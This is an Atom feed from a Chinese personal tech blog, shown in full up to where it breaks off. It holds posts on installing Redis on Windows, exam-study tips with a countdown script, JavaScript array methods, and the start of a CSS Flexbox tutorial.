<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fantasy的技术小站</title>
  
  
  <link href="https://www.777nx.cn/atom.xml" rel="self"/>
  
  <link href="https://www.777nx.cn/"/>
  <updated>2023-12-27T02:51:31.418Z</updated>
  <id>https://www.777nx.cn/</id>
  
  <author>
    <name>Fantasy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis下载和安装（Windows系统）</title>
    <link href="https://www.777nx.cn/posts/ba26833c.html"/>
    <id>https://www.777nx.cn/posts/ba26833c.html</id>
    <published>2023-12-27T01:51:47.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<p>虽然 Redis 官方网站没有提供 Windows 版的安装包，但是，微软开发并维护了针对Win64的Windows版本。下载地址：<a href="https://github.com/MicrosoftArchive/redis/releases">点击前往</a>。</p><p>同时提供蓝奏云网盘下载地址：<a href="https://777nx.lanzouu.com/ikPVk1j2azoh">点击前往</a></p><p>在 Windows 系统下安装 Redis 要比 Linux 系统安装稍微复杂一些，本节详细介绍如何在 Windows 系统上如何安装 Redis。</p><p>打开上述的下载链接，Redis 支持 32 位和 64 位的 Window 系统，大家根据个人情况自行下载，如图所示：</p><p><img src="https://img.777nx.cn/test/image-20231227010909061.png" alt="image-20231227010909061"></p><p>下载完成后，打开相应的文件夹，您会看到如下图所示的文件目录：</p><p><img src="https://img.777nx.cn/test/image-20231227011529705.png" alt="image-20231227011529705"></p><h2 id="创建Redis临时服务">创建Redis临时服务</h2><h3 id="启动服务端程序">启动服务端程序</h3><p>打开 CMD 命令进入 Redis 目录，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\Redis-x64-3.0.504&gt;redis-server.exe redis.windows.conf</span><br></pre></td></tr></table></figure><p>显示如下图所示，表示 Redis 服务已启动</p><p><img src="https://img.777nx.cn/test/image-20231227012517726.png" alt="image-20231227012517726"></p><p>上图中显示一些 Redis 的相关信息，比如 Redis 的版本号以及默认端口号(6379)。注意，为了实现后续操作，请您保持服务端开启状态，否则客户端无法正常工作。</p><h3 id="启动客户端程序">启动客户端程序</h3><p>启动服务端后，后台窗口不要关，新开一个 CMD 窗口，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\Redis-x64-3.0.504&gt;redis-cli.exe</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/image-20231227012824451.png" alt="image-20231227012824451"></p><p>得到如上界面，说明 Redis 本地客户端与服务端连接成功。</p><h2 id="命令创建Redis服务">命令创建Redis服务</h2><p>上述方式虽然简单快捷，但是显然不是程序员的操作，下面介绍，通过命令启动 Redis 服务端，并将 Redis 服务添加到 Windows 资源管理器，实现开机后自动启动。</p><h3 id="注册Redis服务">注册Redis服务</h3><p>通过 CMD 命令行工具进入 Redis 安装目录，将 Redis 服务注册到 Windows 服务中，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server.exe --service-install redis.windows.conf</span><br></pre></td></tr></table></figure><p>执行完后，得到以下输出，说明注册成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1868] 07 Jan 15:00:08.223 <span class="comment"># Granting read/write access to &#x27;NT AUTHORITY\NetworkService&#x27; on: &quot;D:\software\Redis-x64-3.0.504&quot; &quot;D:\software\Redis-x64-3.0.504\&quot;</span></span><br><span class="line">[1868] 07 Jan 15:00:08.230 <span class="comment"># Redis successfully installed as a service.</span></span><br></pre></td></tr></table></figure><h3 id="启动Redis服务">启动Redis服务</h3><p>执行以下命令启动 Redis 服务，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server --service-start</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://img.777nx.cn/test/image-20231227014937687.png" alt="image-20231227014937687"></p><p>注意：此时 Redis 已经被添加到 Windows 服务中，因此不会再显示 Redis 服务端的相应的信息，如下图所示：</p><p><img src="https://img.777nx.cn/test/image-20231227013740690.png" alt="image-20231227013740690"></p><h3 id="启动Redis客户端">启动Redis客户端</h3><p>在 CMD 命令行输出 redis-cli 命令启动客户端，如下所示：</p><p><img src="https://img.777nx.cn/test/image-20231227013916687.png" alt="image-20231227013916687"></p><h3 id="检查是否连接成功">检查是否连接成功</h3><p>测试客户端和服务端是否成功连接。输出<code>PING</code>命令，若返回<code>PONG</code>则证明成功连接。如下所示：</p><p><img src="https://img.777nx.cn/test/image-20231227014031257.png" alt="image-20231227014031257"></p><p>通过上面的操作，我们完成了 Redis 的安装。当然，您也可以将 Redis 加入到环境变量中，如下所示：</p><p><img src="https://img.777nx.cn/test/image-20231227014226734.png" alt="image-20231227014226734"></p><blockquote><p>注意：根据自己的安装路径添加环境变量。</p></blockquote><h2 id="参考">参考</h2><ol><li><a href="https://c.biancheng.net/redis/windows-installer.html">Redis下载和安装（Windows系统）</a></li><li><a href="https://blog.csdn.net/antma/article/details/79225084">Redis安装（Windows环境下Redis安装）</a></li></ol><h2 id="总结">总结</h2><p>下面对安装过程中涉及到的命令进行总结，主要包括以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装服务：redis-server.exe --service-install</span><br><span class="line">卸载服务：redis-server.exe --service-uninstall</span><br><span class="line">开启服务：redis-server.exe --service-start</span><br><span class="line">停止服务：redis-server.exe --service-stop</span><br><span class="line">服务端启动时重命名：redis-server.exe --service-start --service-name Redis1</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Windows安装Redis数据库</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="Redis" scheme="https://www.777nx.cn/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>12月才开始专插本晚吗？</title>
    <link href="https://www.777nx.cn/posts/89c48741.html"/>
    <id>https://www.777nx.cn/posts/89c48741.html</id>
    <published>2023-12-23T16:50:58.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div id="countdown"></div><h2 id="12月才开始专插本晚吗">12月才开始专插本晚吗?</h2><p>一点都不晚！很多人都是利于短期的记忆去备考上岸的，有些人不适合战线拉太长，拖着拖着可能就会开始摆烂状态，所以现在开始插本一点都不晚！</p><h3 id="英语：">英语：</h3><p>尽早开始尽早背，英语词汇靠积累，一蹴而就是不可能的，背单词和语法的重要性我觉得是3:2，词汇量决定所有题目的阅读速度，而语法更多体现在语法填空，完型多多少少带一点，刷真题，梳理每种题型的解题思路，找到自己的做题方法才是关键，作文我是背模板提高的，学習的苐一步就是模仿，背得多了，了解各种题型和英语表达的顺序，自然也能自己写作文了，注意，字体写工整！</p><h3 id="专业课：">专业课：</h3><p>不管是什么专业都可以按照这个备考思路：跟着💻课过一遍书上全部的内容，每天定量刷题，今日事今日毕，错题当天就要刷新记忆，记正确答案，再结合教材查缺补漏，扫盲知识点，最后刷错题，把对应的考点和知识点抄在笔记本上，考前专注看错题本和笔记本就够了，能省很多时间</p><h3 id="政治：">政治：</h3><p>回归课本(两本书)每天学习1章，与重点笔记一起看，做好章节巩固练习，4周完成，熟记政治90条知识点(每天读一遍)，过完书之后，100道大题，每天一章，23年时政热点+习题(最后5天刷)，考前一周一套历年真题试卷(近10年的真题都刷一遍)</p><h2 id="心态">心态</h2><ol><li>摆烂了怎么办<br>就算有一时的摆烂，也不要责怪自己，人之常情也给自己两分钟深呼吸，忘掉过去，然后继续学习</li><li>成绩上不去怎么办<br>很努力，但是成绩一直上不去，特别焦虑怎么办心态放松，你只是学习的方法不对，尝试换一种方法学</li><li>压力太大怎么办？<br>无限内耗只会加重拖延和焦虑，可以去找你自己喜欢的放松方式，可以冥想一会，让自己的大脑放空，听音乐，总之这些都是不错的选择</li></ol><h2 id="备考材料：">备考材料：</h2><p>英语：3500词汇，核心1000词，18个语法思维导图，阅读理解，完形填空，语法填空100道，作文模板，近年真题<br>政治：两本书重点笔记，思维导图，90条知识点，100道大题，近年真题，时政热点</p><script>    // 设置专插本考试日期    var targetDate = new Date('March 30, 2024 00:00:00').getTime();    // 更新倒计时的函数    function updateCountdown() {        var currentDate = new Date().getTime();        var timeRemaining = targetDate - currentDate;            // 计算时、分、秒        var days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));            // 更新页面上的倒计时        document.getElementById('countdown').innerHTML = `离24普通专升本考试还剩${days}天。`            // 如果考试日期已过，显示提示信息        if (timeRemaining < 0) {            document.getElementById('countdown').innerHTML = '考试已经开始';        }    }        // 每秒更新一次倒计时    setInterval(updateCountdown, 1000);        // 初始化页面加载时的倒计时    updateCountdown();</script>]]></content>
    
    
    <summary type="html">一点都不晚！</summary>
    
    
    
    <category term="生活趣闻" scheme="https://www.777nx.cn/categories/%E7%94%9F%E6%B4%BB%E8%B6%A3%E9%97%BB/"/>
    
    
    <category term="专插本" scheme="https://www.777nx.cn/tags/%E4%B8%93%E6%8F%92%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript常用数组方法</title>
    <link href="https://www.777nx.cn/posts/d1397e67.html"/>
    <id>https://www.777nx.cn/posts/d1397e67.html</id>
    <published>2023-12-07T17:43:19.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>参考：<a href="https://zhuanlan.zhihu.com/p/602781589">JavaScript 常用数组方法</a></p></div><h2 id="forEach">forEach</h2><blockquote><p>forEach()方法将为每个数组元素执行一次指定的函数<br>返回值：undefined</p></blockquote><p><img src="https://img.777nx.cn/test/v2-cebbb5dcc1a2dab5cfa68d3fbfd21053_720w.webp" alt="img"></p><h2 id="map">map</h2><blockquote><p>map()方法创建一个新数组，这个新数组由原数组中的每个元素都调用一次提供的函数后的返回值组成<br>返回值：一个新数组，每个元素都是回调函数的返回值</p></blockquote><p><img src="https://img.777nx.cn/test/v2-d4a8f2fd1c28d6437fbffd8fecc0cb0c_720w.webp" alt="img"></p><h2 id="concat">concat</h2><blockquote><p>concat()方法用于合并两个或多个数组<br>此方法不会更改现有数组，而是返回一个新数组<br>返回值：新的Array实例</p></blockquote><p><img src="https://img.777nx.cn/test/v2-a86f2b5e69d723f548460a0c946bf0a6_720w.webp" alt="img"></p><h2 id="push">push</h2><blockquote><p><code>push()</code>方法将一个或多个元素添加到数组的末尾，并返回该数组的新长度<br>返回值：当调用该方法时，新的length属性值将被返回。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-b029be8144f72515797646f478e00c17_720w.webp" alt="img"></p><h2 id="pop">pop</h2><blockquote><p><code>pop()</code>方法从数组中删除最后一个元素，并返回该元素的值。<br>此方法会更改数组的长度。<br>返回值：从数组中删除的元素（当数组为空时返回undefined）</p></blockquote><p><img src="https://img.777nx.cn/test/v2-42153fe9a707a01d96e5eef1f301c7f4_720w.webp" alt="img"></p><h2 id="splice">splice</h2><blockquote><p><code>splice()</code>方法通过删除或替换现有元素或者原地添加新的元素来修改数组，并以数组形式返回被修改的内容。<br>此方法会改变原数组。<br>返回值：由被删除的元素组成的一个数组。如果只删除了一个元素，则返回只包含一个元素的数组。如果没有删除元素，则返回空数组。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-5aee83dfdc2b055f68c0e382fe075c0b_720w.webp" alt="img"></p><h2 id="slice">slice</h2><blockquote><p><code>slice()</code>方法返回一个新的数组对象，这一对象是一个由<code>begin</code>和<code>end</code>决定的原数组的<strong>浅拷贝</strong>（包括<code>begin</code>，不包括<code>end</code>）<br>原始数组不会被改变<br>返回值：一个含有被提取元素的新数组</p></blockquote><p><img src="https://img.777nx.cn/test/v2-65eeaf11e76c23777b0f4d7ec33ed541_720w.webp" alt="img"></p><h2 id="shift">shift</h2><blockquote><p><code>shift()</code>方法从数组中删除<strong>第一个</strong>元素，并返回该元素的值。<br>此方法更改数组的长度。<br>返回值：从数组中删除的元素; 如果数组为空则返回undefined</p></blockquote><p><img src="https://img.777nx.cn/test/v2-b3351f29f4caa4cd797bd4aecf594d78_720w.webp" alt="img"></p><h2 id="unshift">unshift</h2><blockquote><p><code>unshift()</code>方法将一个或多个元素添加到数组的<strong>开头</strong>，并返回该数组的<strong>新长度</strong>。<br>返回值：返回调用方法对象的新length属性值。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-82ccb8d80da22dbe515f9a6d5f9f0cd5_720w.webp" alt="img"></p><h2 id="join">join</h2><blockquote><p><code>join()</code>方法将一个数组（或一个类数组对象）的所有元素连接成一个字符串并返回这个字符串，用逗号或指定的分隔符字符串分隔。<br>如果数组只有一个元素，那么将返回该元素而不使用分隔符。<br>返回值：一个所有数组元素连接的字符串。如果 <code>arr.length</code> 为 0，则返回空字符串。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-443de77c189cc705730ed7e3dc7a4247_720w.webp" alt="img"></p><h2 id="every">every</h2><blockquote><p><code>every()</code>方法测试一个数组内的所有元素是否都能通过某个指定函数的测试。<br>它返回一个布尔值。<br>返回值：如果回调函数的每一次返回都为真值，返回<code>true</code>，否则返回<code>false</code></p></blockquote><p><img src="https://img.777nx.cn/test/v2-4b96a801a80ac3fc01acae0242d17fcc_720w.webp" alt="img"></p><h2 id="filter">filter</h2><blockquote><p><code>filter()</code>方法创建给定数组一部分的<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Shallow_copy">浅拷贝</a>，其包含通过所提供函数实现的测试的所有元素。<br>返回值：一个新的、由通过测试的元素组成的数组，如果没有任何数组元素通过测试，则返回空数组。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-6f84a86640c688f243413568df330279_720w.webp" alt="img"></p><h2 id="indexOf">indexOf</h2><blockquote><p><code>indexOf()</code>方法返回在数组中可以找到给定元素的第一个索引，如果不存在，则返回-1。<br>返回值：首个被找到的元素在数组中的索引位置; 若没有找到则返回**-1**。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-46d22d31ded058d6df397f0bc43f4f4e_720w.webp" alt="img"></p><h2 id="reduce">reduce</h2><blockquote><p><code>reduce()</code>方法对数组中的每个元素按序执行一个由您提供的 <strong>reducer</strong> 函数，每一次运行 <strong>reducer</strong> 会将先前元素的计算结果作为参数传入，最后将其结果汇总为单个返回值。<br>第一次执行回调函数时，不存在“上一次的计算结果”。如果需要回调函数从数组索引为 0 的元素开始执行，则需要传递初始值。否则，数组索引为 0 的元素将被作为初始值 <em>initialValue</em>，迭代器将从第二个元素开始执行（索引为 1 而不是 0）。<br>返回值：使用“reducer”回调函数遍历整个数组后的结果。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-c33f6bd5f718c0a98acf810316b2a064_720w.webp" alt="img"></p><h2 id="reverse">reverse</h2><blockquote><p><code>reverse()</code>方法将数组中元素的位置颠倒，并返回该数组。<br>数组的第一个元素会变成最后一个，数组的最后一个元素变成第一个。<br>该方法会改变原数组。<br>返回值：颠倒后的数组</p></blockquote><p><img src="https://img.777nx.cn/test/v2-3d2d4fd63d8b6c5325f58cefdc7f2c80_720w.webp" alt="img"></p><h2 id="sort">sort</h2><blockquote><p><code>sort()</code>方法用<a href="https://zh.wikipedia.org/wiki/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95">原地算法</a>对数组的元素进行排序，并返回数组。<br>默认排序顺序是在将元素转换为字符串，然后比较它们的 UTF-16 代码单元值序列时构建的<br>由于它取决于具体实现，因此无法保证排序的时间和空间复杂性。<br>返回值：排序后的数组。请注意，数组已原地排序，并且不进行复制。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-8124a0352786d752dbee0803e0a963dc_720w.webp" alt="img"></p><h2 id="toString">toString</h2><blockquote><p><code>toString()</code>方法返回一个字符串，表示指定的数组及其元素。<br>返回值：一个表示数组所有元素的字符串。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-1d454472280637cae6570630809654ef_720w.webp" alt="img"></p><h2 id="at">at</h2><blockquote><p><code>at()</code>方法接收一个整数值并返回该索引对应的元素，允许正数和负数。负整数从数组中的最后一个元素开始倒数。<br>返回值：匹配给定索引的数组中的元素。如果找不到指定的索引，则返回undefined。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-990a543222d3c485e9032cbea11eaa10_720w.webp" alt="img"></p><h2 id="find">find</h2><blockquote><p><code>find()</code>方法返回数组中满足提供的测试函数的第一个元素的值。否则返回<code>undefined</code>。<br>返回值：数组中第一个满足所提供测试函数的元素的值，否则返回<code>undefined</code></p></blockquote><p><img src="https://img.777nx.cn/test/v2-2af854de7b49753b4cda6b82dab073ac_720w.webp" alt="img"></p><h2 id="some">some</h2><blockquote><p><code>some()</code>方法测试数组中是不是至少有 1 个元素通过了被提供的函数测试。<br>它返回的是一个 Boolean 类型的值。<br>返回值：数组中有至少一个元素通过回调函数的测试就会返回<code>true</code>；所有元素都没有通过回调函数的测试返回值才会为 false。</p></blockquote><p><img src="https://img.777nx.cn/test/v2-1aae7f74c3219f6b8362ccdde0d49685_720w.webp" alt="img"></p>]]></content>
    
    
    <summary type="html">分享20个Javascript中的数组方法</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="数组" scheme="https://www.777nx.cn/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>Flex布局详解文档</title>
    <link href="https://www.777nx.cn/posts/c2ac5e09.html"/>
    <id>https://www.777nx.cn/posts/c2ac5e09.html</id>
    <published>2023-11-16T20:53:39.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>参考：<a href="https://www.lovestu.com/cssflex.html">CSS3 Flex 布局详解文档</a></p></div><p>网页布局（layout）是 CSS 的一个重点应用。</p><p><img src="https://img.777nx.cn/test/1600863502-9679-bg2015071001.gif" alt="img"></p><p>布局的传统解决方案，基于<a href="https://www.lovestu.com/wp-content/plugins/cp-link-open/link.php?a=aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQ1NTL2JveF9tb2RlbA==">盒状模型</a>，依赖 <a href="https://www.lovestu.com/wp-content/plugins/cp-link-open/link.php?a=aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQ1NTL2Rpc3BsYXk="><code>display</code></a> 属性 + <a href="https://www.lovestu.com/wp-content/plugins/cp-link-open/link.php?a=aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQ1NTL3Bvc2l0aW9u"><code>position</code></a>属性 + <a href="https://www.lovestu.com/wp-content/plugins/cp-link-open/link.php?a=aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQ1NTL2Zsb2F0"><code>float</code></a>属性。它对于那些特殊布局非常不方便，比如，<a href="https://www.lovestu.com/wp-content/plugins/cp-link-open/link.php?a=aHR0cHM6Ly9jc3MtdHJpY2tzLmNvbS9jZW50ZXJpbmctY3NzLWNvbXBsZXRlLWd1aWRlLw==">垂直居中</a>就不容易实现。</p><p><img src="https://img.777nx.cn/test/1600863498-8001-bg2015071002.png" alt="img"></p><p>2009年，W3C 提出了一种新的方案----Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。</p><p><img src="https://img.777nx.cn/test/1600863499-3507-bg2015071003-300x106.jpg" alt="img"></p><p>Flex 布局将成为未来布局的首选方案。本文介绍它的语法</p><h2 id="Flex-布局是什么？">Flex 布局是什么？</h2><p>Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性。</p><p>任何一个容器都可以指定为 Flex 布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行内元素也可以使用 Flex 布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Webkit 内核的浏览器，必须加上<code>-webkit</code>前缀。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-flex; <span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，设为 Flex 布局以后，子元素的<code>float</code>、<code>clear</code>和<code>vertical-align</code>属性将失效。</p><h2 id="基本概念">基本概念</h2><p>采用 Flex 布局的元素，称为 Flex 容器（flex container），简称&quot;容器&quot;。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称&quot;项目&quot;。</p><p><img src="https://img.777nx.cn/test/1600863498-2127-bg2015071004.png" alt="img"></p><p>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做<code>main start</code>，结束位置叫做<code>main end</code>；交叉轴的开始位置叫做<code>cross start</code>，结束位置叫做<code>cross end</code>。</p><p>项目默认沿主轴排列。单个项目占据的主轴空间叫做<code>main size</code>，占据的交叉轴空间叫做<code>cross size</code>。</p><h2 id="容器的属性">容器的属性</h2><p>以下6个属性设置在容器上。</p><ul><li>flex-direction</li><li>flex-wrap</li><li>flex-flow</li><li>justify-content</li><li>align-items</li><li>align-content</li></ul><h3 id="flex-direction属性">flex-direction属性</h3><p><code>flex-direction</code>属性决定主轴的方向（即项目的排列方向）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863498-2409-bg2015071005.png" alt="img"></p><p>它可能有4个值。</p><ul><li><code>row</code>（默认值）：主轴为水平方向，起点在左端。</li><li><code>row-reverse</code>：主轴为水平方向，起点在右端。</li><li><code>column</code>：主轴为垂直方向，起点在上沿。</li><li><code>column-reverse</code>：主轴为垂直方向，起点在下沿。</li></ul><h3 id="flex-wrap属性">flex-wrap属性</h3><p>默认情况下，项目都排在一条线（又称&quot;轴线&quot;）上。<code>flex-wrap</code>属性定义，如果一条轴线排不下，如何换行。</p><p><img src="https://img.777nx.cn/test/1600863500-1994-bg2015071006.png" alt="img"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它可能取三个值。</p><p>（1）<code>nowrap</code>（默认）：不换行。</p><p><img src="https://img.777nx.cn/test/1600863498-5412-bg2015071007.png" alt="img"></p><p>（2）<code>wrap</code>：换行，第一行在上方。</p><p><img src="https://img.777nx.cn/test/1600863499-3376-bg2015071008.jpg" alt="img"></p><p>（3）<code>wrap-reverse</code>：换行，第一行在下方。</p><p><img src="https://img.777nx.cn/test/1600863499-2610-bg2015071009.jpg" alt="img"></p><h3 id="flex-flow">flex-flow</h3><p><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="justify-content属性">justify-content属性</h3><p><code>justify-content</code>属性定义了项目在主轴上的对齐方式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863499-3601-bg2015071010.png" alt="img"></p><p>它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。</p><ul><li><code>flex-start</code>（默认值）：左对齐</li><li><code>flex-end</code>：右对齐</li><li><code>center</code>： 居中</li><li><code>space-between</code>：两端对齐，项目之间的间隔都相等。</li><li><code>space-around</code>：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li></ul><h3 id="align-items属性">align-items属性</h3><p><code>align-items</code>属性定义项目在交叉轴上如何对齐。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863498-8573-bg2015071011.png" alt="img"></p><p>它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。</p><ul><li><code>flex-start</code>：交叉轴的起点对齐。</li><li><code>flex-end</code>：交叉轴的终点对齐。</li><li><code>center</code>：交叉轴的中点对齐。</li><li><code>baseline</code>: 项目的第一行文字的基线对齐。</li><li><code>stretch</code>（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</li></ul><h3 id="align-content属性">align-content属性</h3><p><code>align-content</code>属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863498-1122-bg2015071012.png" alt="img"></p><p>该属性可能取6个值。</p><ul><li><code>flex-start</code>：与交叉轴的起点对齐。</li><li><code>flex-end</code>：与交叉轴的终点对齐。</li><li><code>center</code>：与交叉轴的中点对齐。</li><li><code>space-between</code>：与交叉轴两端对齐，轴线之间的间隔平均分布。</li><li><code>space-around</code>：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</li><li><code>stretch</code>（默认值）：轴线占满整个交叉轴。</li></ul><h2 id="项目的属性">项目的属性</h2><p>以下6个属性设置在项目上。</p><ul><li><code>order</code></li><li><code>flex-grow</code></li><li><code>flex-shrink</code></li><li><code>flex-basis</code></li><li><code>flex</code></li><li><code>align-self</code></li></ul><h3 id="order属性">order属性</h3><p><code>order</code>属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">order</span>: &lt;integer&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863499-6340-bg2015071013.png" alt="img"></p><h3 id="flex-grow属性">flex-grow属性</h3><p><code>flex-grow</code>属性定义项目的放大比例，默认为<code>0</code>，即如果存在剩余空间，也不放大。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1600863500-5688-bg2015071014.png" alt="img"></p><p>如果所有项目的<code>flex-grow</code>属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的<code>flex-grow</code>属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。</p><h3 id="flex-shrink属性">flex-shrink属性</h3><p><code>flex-shrink</code>属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 1 